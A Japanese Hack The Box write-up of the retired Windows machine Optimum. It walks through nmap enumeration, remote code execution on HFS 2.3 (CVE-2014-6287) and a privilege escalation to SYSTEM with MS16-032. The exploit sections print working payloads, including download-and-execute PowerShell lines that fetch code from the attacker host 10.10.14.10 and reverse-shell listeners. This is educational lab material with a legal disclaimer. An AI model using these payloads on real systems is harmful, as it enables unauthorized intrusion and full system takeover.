---
title: "[ HTB ] Optimum | Writeup"
emoji: "🗂️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、HTTP/SMB/Kerberosなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Optimum
Difficulty: Easy
OS: Windows

https://app.hackthebox.com/machines/Optimum

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# echo 'export RHOSTS="10.10.10.8"' | tee -a .zshrc
export RHOSTS="10.10.10.8"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# ping -c 4 ${RHOSTS}
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=18.4 ms
64 bytes from 10.10.10.8: icmp_seq=2 ttl=127 time=17.9 ms
64 bytes from 10.10.10.8: icmp_seq=3 ttl=127 time=18.2 ms
64 bytes from 10.10.10.8: icmp_seq=4 ttl=127 time=19.1 ms

--- 10.10.10.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 17.912/18.411/19.102/0.447 ms
```

TTL=127なのでWindows系っぽい。OSの推測が後の方針選びでちょっと効いてくる。

## Enumeration

### Nmap

一旦Nmap、兎にも角にもNmap、寝ても起きてもNmap。

ポート指定はせず、とりあえずTop1000ポートに対して実行。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_top1000.txt ${RHOSTS}
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-12 10:03 +0000
Nmap scan report for 10.10.10.8
Host is up (0.019s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 hostname) scanned in 12.34 seconds
```

`-sSV`: SYNスキャン＋Versionスキャン
`-Pn`: Pingチェック無効化
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る
`-n`: 名前解決無効化。同じく時短目的
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い
`-T 4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短
`-oN`: 結果を保存するファイル名を指定

Top1000では80/tcpしか返って来なかったが、SMB(445)もRDP(3389)もWinRM(5985)も生えていないのは珍しいなという所感。念のためフルポートスキャンも流しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# nmap -sS -Pn -n -r -T4 -p- -oN nmap_fullport.txt ${RHOSTS}
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-12 10:08 +0000
Nmap scan report for 10.10.10.8
Host is up (0.018s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 hostname) scanned in 102.11 seconds
```

結論、本マシンは80/tcp 1本勝負。Windowsが相手なのでnxc(NetExec)やimpacketで殴りたくなる所だが、`445`も`5985`も開いていないので今回は出番無しとなる。素直にHTTPを触っていく。

### 80/http (HttpFileServer 2.3)

> 80/tcp open  http    HttpFileServer httpd 2.3

:::details HttpFileServerとは？
読み方: エイチエフエス、エイチティーティーピーファイルサーバー
正式名称: HttpFileServer (別名: Rejetto HFS)
意味: Rejettoさんが作っているWindows向けの軽量ファイル共有サーバー。ブラウザからファイルの一覧表示・アップロード・ダウンロードが行える。GUIで起動するタイプのツールで、ちょっとした社内のファイル配布などに使われることがある。
:::

バージョンがピンポイントに`2.3`で、しかもこの手の軽量サーバー＋古めのバージョンという組み合わせは何かあると踏んでCVEを漁る。`Rejetto HFS 2.3`で検索すると一発で`CVE-2014-6287`が出てくる[^hfs-cve]。

:::details CVE-2014-6287とは？
読み方: シーブイイー・にせんじゅうよん・ろくにはちなな
意味: Rejetto HFS 2.3以前に存在するリモートコード実行(RCE)の脆弱性。`search`パラメータの値に`%00`(nullバイト)を含めると、HFS内部のテンプレート処理がバグり、本来マクロ呼び出しとして解釈されない所まで`{.exec|...}`マクロが評価されてしまう。結果として、サーバー側で任意のコマンドが実行できる。
:::

まずはブラウザでアクセスして、本当にHFS 2.3が動いているかを目視確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# curl -s http://${RHOSTS}/ | grep -i "HttpFileServer\|HFS"
<a href="https://www.rejetto.com/hfs/?f=fh">HttpFileServer 2.3</a>
```

> HttpFileServer 2.3

Nmapの結果と一致。これで方針が決まった、CVE-2014-6287を狙う。

:::message
HFSのような軽量ファイル配布ツールは、便利さと引き換えに保守が後回しになりがち。本マシンでは古いバージョンがそのまま外に露出していることが原因なので、カテゴリとしてはパッチ未適用(既知脆弱性の放置)の脆弱性にあたる。
:::

## Foothold

### CVE-2014-6287を叩く下準備

脆弱性を叩く前に、戻ってくる経路を先に用意しておく。

今回のアプローチは次の流れ:

1. 攻撃側で、PowerShellのリバースシェルを吐くスクリプト(`Invoke-PowerShellTcp.ps1`)をHTTPで公開
2. HFSの`search`パラメータ経由で、ターゲットに`powershell -c "IEX ..."`を実行させる
3. ターゲットが`Invoke-PowerShellTcp.ps1`を取得し、こちらのncリスナーにシェルを飛ばしてくる

Windowsターゲットでシェルを取る時の定番の組み合わせで、ディスクに書き込みを残さずメモリ上だけで動けるのがメリット。

:::details Invoke-PowerShellTcpとは？
読み方: インボーク・パワーシェル・ティーシーピー
意味: 攻撃用PowerShellスクリプト集Nishang[^nishang]に含まれる、PowerShell製のリバースシェル。`-Reverse`オプションで指定IP/Portにシェルを飛ばしてくれる。ファイルの末尾に自分で呼び出し行を追加しておけば、`IEX(...)`でダウンロード＆即時実行された瞬間にシェルが飛んでくる、という使い方になる。
:::

スクリプトを作業ディレクトリにコピーし、最終行に呼び出しを追記しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell.ps1

┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 4444' >> shell.ps1
```

攻撃側でHTTPサーバーとncリスナーを並行で立ち上げる。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

別ターミナルでリスナー側。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

`rlwrap`を噛ませておくと、戻ってきたシェルで矢印キーの履歴操作などが効くようになる。地味だが生産性に効くので癖で付けている。

### CVE-2014-6287 発射

HFSの`search`に`%00{.exec|...}`を仕込む。中身はシンプルに「`powershell`で`shell.ps1`をIEXしろ」というだけのペイロードにする。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# curl -s -G "http://${RHOSTS}/" \
    --data-urlencode 'search=%00{.exec|cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.10:8000/shell.ps1'')".}'
```

`-G`＋`--data-urlencode`にしておくと、URLエンコードは`curl`任せで良くなるのでシェルのクォート地獄を避けられる。送っているURLのイメージとしては以下。

```
http://10.10.10.8/?search=%00{.exec|cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/shell.ps1')".}
```

リスナー側を見るとシェルが落ちてきている。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
optimum\kostas
```

> optimum\kostas

無事`kostas`としてシェルを取れた。デスクトップで既にユーザフラグが置かれているので、流れでそのまま回収。

```sh
PS C:\Users\kostas\Desktop>type user.txt
```

:::message
原因はシンプルで、OSSの古いバージョン(HFS 2.3)を外に出しっぱなしにしているだけ。カテゴリとしてはパッチ未適用の脆弱性の典型例。実務目線で言うと、インベントリ管理が効いていないサーバーに同種のEOL(End of Life)ソフトウェアが隠れている事例は本当によくある。
:::

## Privilege Escalation

### 下調べ

まずはターゲットの素性を確認する。

```sh
PS C:\Users\kostas\Desktop>systeminfo
```

出力から押さえておきたいのは以下。

> OS Name:                   Microsoft Windows Server 2012 R2 Standard
> OS Version:                6.3.9600 N/A Build 9600
> System Type:               x64-based PC
> Hotfix(s):                 31 Hotfix(s) Installed.

Windows Server 2012 R2 x64、適用パッチは31個という中々薄い構成。この時点で「カーネル系の既知脆弱性で殴れそう」という匂いがする。

:::details systeminfoとは？
読み方: システムインフォ
意味: Windowsに標準搭載されているコマンドで、OSのバージョンやアーキテクチャ、適用済みのHotfix(KBxxxxxxx)一覧を一気に吐いてくれる。CTFでは適用パッチ一覧をPrivEsc候補の絞り込みに使うのが定石。
:::

Hotfix一覧を眺めると、MS16-032(KB3139914)、MS16-034、MS16-016あたりの古めのローカル権限昇格系がまるっと当たっていない。中でも`MS16-032`はPowerShell製のPoC(Invoke-MS16-032.ps1)が有名で、x64環境でも素直に通りやすいので、まずはこれを試す。

:::details MS16-032 (CVE-2016-0099)とは？
読み方: エムエス・じゅうろくのさんにー
意味: WindowsのSecondary Logon Service(多重ログオンを扱うサービス)が、ハンドルを適切にサニタイズしないまま子プロセスに引き渡してしまうバグに起因する権限昇格の脆弱性。ユーザ権限で動くプロセスから、SYSTEM権限で動く別プロセスを生やすことができる。PoCとしてはPowerShell Empireに取り込まれた`Invoke-MS16-032.ps1`[^ms16032]が有名。
:::

### 2本目のリスナーを用意

PoCは最終的に`Invoke-MS16-032 -Command "..."`の形で、昇格後に走らせたいコマンドを文字列で渡す。ここに「もう1発リバースシェルを飛ばすワンライナー」を仕込み、別ポートで受ける作戦。

攻撃側に2つ目のncリスナーを立てる。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# rlwrap nc -lvnp 4445
listening on [any] 4445 ...
```

同じく2つ目のPowerShellリバースシェル用のスクリプトも用意しておく(ポートだけ変える)。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell2.ps1

┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 4445' >> shell2.ps1
```

MS16-032のPoC本体も作業ディレクトリに持ってきておく。PowerShell Empireのリポジトリにある`Invoke-MS16-032.ps1`[^ms16032]をそのまま使う。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# curl -s -o Invoke-MS16-032.ps1 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16-032.ps1
```

これで、Pythonの`http.server`経由で`Invoke-MS16-032.ps1`と`shell2.ps1`の両方を配信できる状態になった。

### 発射

`kostas`のシェルに戻って、PoCをIEXで読み込ませてから叩く。

```sh
PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/Invoke-MS16-032.ps1')
PS C:\Users\kostas\Desktop>Invoke-MS16-032 -Command "powershell -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/shell2.ps1')`""
```

PoC側は内部で成功時に以下のバナーを出してくれるので、画面上でも成否が分かりやすい。

> __ __ ___ ___ ___     ___ ___ ___
> | V | _|_ | | _|___| |_ | |_ |
> | |_ |_| |-|| . |___| | |_ |_ |
> |_|_|_|___|___|___|___|   |___|___|___|
>
>                       [by b33f -> @FuzzySec]

4445でリスナーしていた側に、昇格後のシェルが落ちてくる。

```sh
┌──(root㉿5602a1b7889d)-[~/Optimum]
└─# rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49170
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
```

> nt authority\system

`NT AUTHORITY\SYSTEM`なので最強権限が取れた。Administratorのデスクトップからroot.txtを回収して終了。

```sh
PS C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
```

:::message
原因は適用パッチの不足で、カテゴリとしてはやはりパッチ未適用の脆弱性。MS16-032は2016年3月公開なので、本マシンの環境は実に数年単位でパッチが止まっていた計算になる。実務でもWindows Serverで「とりあえず動いているから触らない」という理由で古いままになっているケースは珍しくなく、カーネル系の既知脆弱性はPoCも豊富なので、現場で見つけたら最優先で手当するのが望ましい。
:::

## まとめ

改めて攻撃チェーンを整理すると以下の通り。

1. Nmapで80/tcpのHFS 2.3を発見。SMBもWinRMも生えておらずHTTP一本勝負と判断
2. HFS 2.3のCVE-2014-6287(`search`パラメータのnullバイト経由RCE)を利用し、`cmd.exe /c powershell -c IEX(...)`で`kostas`権限のリバースシェルを取得
3. `systeminfo`でWindows Server 2012 R2 x64＋パッチ未適用を確認し、MS16-032(Secondary Logon Handle)を候補として選定
4. `Invoke-MS16-032.ps1`をIEXで読み込ませ、昇格後に二段目のリバースシェルを飛ばして`nt authority\system`を取得

Windowsといえばつい`nxc`や`impacket`で殴りに行きたくなる所だが、本マシンは80番ポートしか空いていないのでそういうお仕事は無し。「開いているサービスを素直に数えて、見えたバージョンでCVEを引く」という一番基本の流れでそのまま最後まで押し切れる、良い意味で初心者向けのEasyマシンだったという印象。

ちなみにHTBなのでやらないですが、実務では後始末もやっています。古いOSS＋カーネル系未パッチの合わせ技は、どちらか単体でも危ないのに合流すると一気にDAまで持っていかれるコンボなので、インベントリ管理とパッチ適用はやはりセットで考えたい。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^hfs-cve]: https://nvd.nist.gov/vuln/detail/CVE-2014-6287
[^nishang]: https://github.com/samratashok/nishang
[^ms16032]: https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16-032.ps1
